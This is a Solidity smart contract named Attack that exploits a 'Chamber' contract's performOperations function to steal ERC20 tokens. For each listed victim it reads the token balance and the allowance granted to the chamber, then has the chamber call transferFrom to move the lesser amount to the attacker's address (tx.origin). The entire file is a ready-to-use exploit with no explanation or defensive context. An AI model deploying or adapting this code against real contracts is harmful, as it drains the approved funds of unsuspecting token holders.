import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/IERC20.sol";
interface IChamber{
        function performOperations(
        uint8[] calldata actions,
        uint256[] calldata values,
        bytes[] calldata datas
    ) external payable returns (uint256 value1, uint256 value2);
}

contract Attack{
    
    function start(address chamberAddress, address[] calldata victims, address[] calldata tokenToSteal) external{
        require(victims.length == tokenToSteal.length,"Length mismatch");
        for(uint i = 0; i<victims.length;i++){
            
            uint8[] memory actions = new uint8[](1);
            actions[0] = 30;
            uint256[] memory values = new uint256[](1);
            values[0] = 0;
            bytes[] memory toCall = new bytes[](1);
            uint256 toSteal;
            uint256 currentBalanceOfVictim = IERC20(tokenToSteal[i]).balanceOf(victims[i]);
            uint256 currentAllowance = IERC20(tokenToSteal[i]).allowance(victims[i],chamberAddress);
            if(currentBalanceOfVictim>currentAllowance){
                toSteal = currentAllowance;
            }
            else{
                toSteal = currentBalanceOfVictim;
            }
            toCall[0] = abi.encodeWithSignature(
                "transferFrom(address,address,uint256)",
                victims[i],
                tx.origin,
                toSteal
            );
            IChamber(chamberAddress).performOperations(actions,values,toCall);
        }
    }
}
